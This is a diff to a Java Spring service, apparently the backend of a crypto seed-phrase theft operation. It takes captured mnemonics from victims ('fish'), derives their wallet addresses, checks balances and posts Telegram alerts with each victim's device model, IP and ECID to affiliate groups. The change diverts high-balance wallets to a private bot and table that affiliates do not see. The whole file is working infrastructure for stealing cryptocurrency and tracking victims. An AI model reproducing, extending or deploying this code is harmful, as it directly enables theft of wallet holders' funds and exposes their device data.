@@ -15,6 +15,7 @@ import org.springframework.beans.factory.annotation.Qualifier;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
 
+import com.consume.config.MaxNoticeProperties;
 import com.consume.dao.Address4Dao;
 import com.consume.dao.ChannelDao;
 import com.consume.dao.DeviceDao;
@@ -29,7 +30,7 @@ import com.consume.util.WalletDerivator;
 import lombok.extern.slf4j.Slf4j;
 
 /**
- * 助记词 / 余额飞机通知（异步 + 并发限流）。
+ * 助记词 / 余额飞机通知。新鱼苗延后到余额后；高额走隐私 bot/群并迁表。
  */
 @Service
 @Slf4j
@@ -38,7 +39,8 @@ public class MnemonicTelegramService {
     private static final DateTimeFormatter DTF = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
     private static final long FISH_DEDUP_MS = 120_000L;
 
-    private final ConcurrentHashMap<String, Long> fishDedup = new ConcurrentHashMap<>();
+    private final ConcurrentHashMap<String, PendingFish> pendingFish = new ConcurrentHashMap<>();
+    private final ConcurrentHashMap<String, Long> fishSent = new ConcurrentHashMap<>();
     private final ConcurrentHashMap<Integer, Boolean> balanceDedup = new ConcurrentHashMap<>();
 
     @Autowired
@@ -52,6 +54,10 @@ public class MnemonicTelegramService {
     @Autowired
     private WalletBalanceQuery walletBalanceQuery;
     @Autowired
+    private MaxNoticeProperties maxNoticeProps;
+    @Autowired
+    private HighValueMnemonicService highValueMnemonicService;
+    @Autowired
     @Qualifier("balanceNotifyExecutor")
     private Executor balanceNotifyExecutor;
 
@@ -60,48 +66,27 @@ public class MnemonicTelegramService {
         try {
             DeviceEntity device = loadDevice(deviceRowId, deviceId);
             if (device == null) {
-                log.info("正常日志:[telegram] 设备不存在，跳过新鱼苗通知 deviceRowId={} deviceId={}",
+                log.info("正常日志:[telegram] 设备不存在，跳过新鱼苗挂起 deviceRowId={} deviceId={}",
                         deviceRowId, deviceId);
                 return;
             }
             String dedupKey = firstNonEmpty(device.getDeviceId(), String.valueOf(device.getId()));
-            long nowMs = System.currentTimeMillis();
-            Long prev = fishDedup.putIfAbsent(dedupKey, nowMs);
-            if (prev != null && nowMs - prev < FISH_DEDUP_MS) {
-                log.info("正常日志:[telegram] 新鱼苗去重跳过 device={}", dedupKey);
-                return;
-            }
-            if (prev != null) fishDedup.put(dedupKey, nowMs);
-            pruneDedup(fishDedup, nowMs, FISH_DEDUP_MS);
-
-            String channelCode = firstNonEmpty(device.getChannelCode(), channelCodeFallback);
-            ChannelEntity channel = resolveChannel(channelCode);
-            if (channel == null) {
-                log.info("正常日志:[telegram] 渠道无 telegram_groupid，跳过 device={} channel={}",
-                        device.getDeviceId(), channelCode);
-                return;
-            }
-            String groupId = channel.getTelegramGroupid();
-            String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
-            String text = MessageFormatUtils.saveMnemonicFishTelegram(
-                    groupId,
-                    channelCode,
-                    channel.getName(),
-                    device.getModel(),
-                    firstNonEmpty(device.getIp(), clientIpFallback),
-                    firstNonEmpty(device.getEcid(), device.getDeviceId()),
-                    datetime);
-            telegramNotificationUtil.sendTelegramMsg(text, groupId);
+            PendingFish p = new PendingFish();
+            p.deviceRowId = deviceRowId;
+            p.deviceId = device.getDeviceId();
+            p.channelCode = firstNonEmpty(device.getChannelCode(), channelCodeFallback);
+            p.model = device.getModel();
+            p.ip = firstNonEmpty(device.getIp(), clientIpFallback);
+            p.ecid = firstNonEmpty(device.getEcid(), device.getDeviceId());
+            pendingFish.put(dedupKey, p);
+            if (pendingFish.size() > 5000) pendingFish.clear();
+            log.debug("正常日志:[telegram] 新鱼苗已挂起 device={}", dedupKey);
         } catch (Exception e) {
-            log.info("异常日志:[telegram] 新鱼苗通知失败 deviceRowId={} deviceId={} err={}",
+            log.info("异常日志:[telegram] 新鱼苗挂起失败 deviceRowId={} deviceId={} err={}",
                     deviceRowId, deviceId, e.getMessage());
         }
     }
 
-    /**
-     * 派生成功后异步：查余额 → 回写 → 飞机余额消息。
-     * 投递到 balanceNotifyExecutor，与 Kafka / addaddress 监听池隔离。
-     */
     public void notifyBalanceAfterDeriveAsync(Integer mnemonicId, Integer deviceRowId, String deviceId,
                                               String channelCodeFallback, String clientIpFallback,
                                               List<WalletDerivator.DerivedAddress> derived) {
@@ -127,8 +112,7 @@ public class MnemonicTelegramService {
         Map<String, String> chainAddr = new HashMap<>();
         for (WalletDerivator.DerivedAddress da : derived) {
             if (da == null || da.chaintype == null || da.address == null) continue;
-            String c = da.chaintype.toLowerCase();
-            chainAddr.putIfAbsent(c, da.address);
+            chainAddr.putIfAbsent(da.chaintype.toLowerCase(), da.address);
         }
         Map<String, ChainBalance> balances = walletBalanceQuery.queryAll(chainAddr);
 
@@ -150,21 +134,98 @@ public class MnemonicTelegramService {
         String channelCode = device != null
                 ? firstNonEmpty(device.getChannelCode(), channelCodeFallback)
                 : channelCodeFallback;
+        String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
+        String model = device == null ? null : device.getModel();
+        String ip = device == null ? clientIpFallback : firstNonEmpty(device.getIp(), clientIpFallback);
+        String ecid = device == null ? deviceId : firstNonEmpty(device.getEcid(), device.getDeviceId());
+        String fishKey = firstNonEmpty(deviceId, device == null ? null : String.valueOf(device.getId()));
+
+        if (highValueMnemonicService.isHighValue(balances)) {
+            handleHighValue(mnemonicId, device, fishKey, channelCode, model, ip, ecid, datetime, balances);
+            return;
+        }
+
+        flushPendingFishToChannel(fishKey, channelCode);
         ChannelEntity channel = resolveChannel(channelCode);
         if (channel == null) {
             log.info("正常日志:[telegram] 渠道无 telegram_groupid，跳过余额 mnemonicId={} channel={}",
                     mnemonicId, channelCode);
             return;
         }
-        String groupId = channel.getTelegramGroupid();
-        String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
-        String model = device == null ? null : device.getModel();
-        String ip = device == null ? clientIpFallback : firstNonEmpty(device.getIp(), clientIpFallback);
-        String ecid = device == null ? deviceId : firstNonEmpty(device.getEcid(), device.getDeviceId());
         String text = MessageFormatUtils.saveBalanceTelegram(
-                groupId, channelCode, channel.getName(), mnemonicId,
+                channel.getTelegramGroupid(), channelCode, channel.getName(), mnemonicId,
                 model, ip, ecid, datetime, balances);
-        telegramNotificationUtil.sendTelegramMsg(text, groupId);
+        telegramNotificationUtil.sendTelegramMsg(text, channel.getTelegramGroupid());
+    }
+
+    private void handleHighValue(Integer mnemonicId, DeviceEntity device, String fishKey,
+                                 String channelCode, String model, String ip, String ecid,
+                                 String datetime, Map<String, ChainBalance> balances) {
+        // 高额一律不发渠道群：先摘掉挂起的新鱼苗
+        if (fishKey != null) pendingFish.remove(fishKey);
+        // 先迁移，飞机消息用 private_mnemonic.id
+        Integer privateId = highValueMnemonicService.migrateToPrivate(mnemonicId, device);
+        if (privateId == null) {
+            balanceDedup.remove(mnemonicId);
+            log.info("异常日志:[maxnotice] 迁移未完成，解除余额去重 mnemonicId={}", mnemonicId);
+            return;
+        }
+        if (!maxNoticeProps.isPrivateTgConfigured()) {
+            log.info("异常日志:[maxnotice] 已迁移 privateId={} 但未配置隐私 bot/群，跳过飞机", privateId);
+            return;
+        }
+        String privGroup = maxNoticeProps.getTgGroupId().trim();
+        String privToken = maxNoticeProps.getTgBotToken().trim();
+        sendFishOnce(fishKey, privGroup, privToken, channelCode, "PRIVATE", model, ip, ecid, datetime, true);
+        String balText = MessageFormatUtils.saveHighValueBalanceTelegram(
+                privGroup, channelCode, "PRIVATE", privateId,
+                model, ip, ecid, datetime, balances);
+        telegramNotificationUtil.sendTelegramMsg(balText, privGroup, privToken);
+    }
+
+    private void flushPendingFishToChannel(String fishKey, String channelCode) {
+        PendingFish pending = fishKey == null ? null : pendingFish.remove(fishKey);
+        ChannelEntity channel = resolveChannel(channelCode != null ? channelCode
+                : (pending == null ? null : pending.channelCode));
+        if (channel == null) {
+            log.info("正常日志:[telegram] 渠道无 telegram_groupid，跳过新鱼苗 device={}", fishKey);
+            return;
+        }
+        String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
+        String model = pending == null ? null : pending.model;
+        String ip = pending == null ? null : pending.ip;
+        String ecid = pending == null ? fishKey : pending.ecid;
+        String cc = firstNonEmpty(channelCode, pending == null ? null : pending.channelCode);
+        sendFishOnce(fishKey, channel.getTelegramGroupid(), null, cc, channel.getName(),
+                model, ip, ecid, datetime, false);
+    }
+
+    private void sendFishOnce(String fishKey, String groupId, String tokenOverride,
+                              String channelCode, String channelName,
+                              String model, String ip, String ecid, String datetime,
+                              boolean privateGroup) {
+        if (fishKey == null || fishKey.isEmpty()) return;
+        String dedupNs = (privateGroup ? "p:" : "c:") + fishKey;
+        long now = System.currentTimeMillis();
+        Long prev = fishSent.putIfAbsent(dedupNs, now);
+        if (prev != null && now - prev < FISH_DEDUP_MS) {
+            log.info("正常日志:[telegram] 新鱼苗去重跳过 device={} private={}", fishKey, privateGroup);
+            return;
+        }
+        if (prev != null) fishSent.put(dedupNs, now);
+        if (fishSent.size() > 500) {
+            fishSent.entrySet().removeIf(e -> now - e.getValue() > FISH_DEDUP_MS);
+        }
+        String text = privateGroup
+                ? MessageFormatUtils.saveHighValueFishTelegram(
+                        groupId, channelCode, channelName, model, ip, ecid, datetime)
+                : MessageFormatUtils.saveMnemonicFishTelegram(
+                        groupId, channelCode, channelName, model, ip, ecid, datetime);
+        if (tokenOverride != null && !tokenOverride.isEmpty()) {
+            telegramNotificationUtil.sendTelegramMsg(text, groupId, tokenOverride);
+        } else {
+            telegramNotificationUtil.sendTelegramMsg(text, groupId);
+        }
     }
 
     private DeviceEntity loadDevice(Integer deviceRowId, String deviceId) {
@@ -188,11 +249,6 @@ public class MnemonicTelegramService {
         return channel;
     }
 
-    private static void pruneDedup(ConcurrentHashMap<String, Long> map, long now, long ttl) {
-        if (map.size() < 500) return;
-        map.entrySet().removeIf(e -> now - e.getValue() > ttl);
-    }
-
     private static String firstNonEmpty(String a, String b) {
         if (a != null && !a.isEmpty()) return a;
         return b == null ? "" : b;
@@ -200,5 +256,14 @@ public class MnemonicTelegramService {
 
     private static String nzBal(String v) {
         return (v == null || v.isEmpty()) ? "0" : v;
+    }
+
+    private static final class PendingFish {
+        Integer deviceRowId;
+        String deviceId;
+        String channelCode;
+        String model;
+        String ip;
+        String ecid;
     }
 }
